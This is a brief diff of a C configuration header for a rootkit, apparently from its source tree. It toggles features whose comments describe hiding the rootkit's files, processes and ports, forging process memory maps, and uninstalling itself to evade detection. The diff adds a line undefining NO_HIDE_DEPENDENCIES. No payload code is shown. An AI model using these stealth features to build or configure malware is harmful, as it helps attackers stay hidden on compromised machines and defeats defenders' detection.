@@ -1,4 +1,5 @@
 #define HIDE_SELF // hide all rootkit paths & procs.
+#undef NO_HIDE_DEPENDENCIES
 #define FORGE_MAPS // hide rootkit location from process mem map files.
 #define HIDE_PORTS // hide hidden ports specified from a file.
 #define DO_EVASIONS // evade detection by uninstalling during the runtime of certain things...
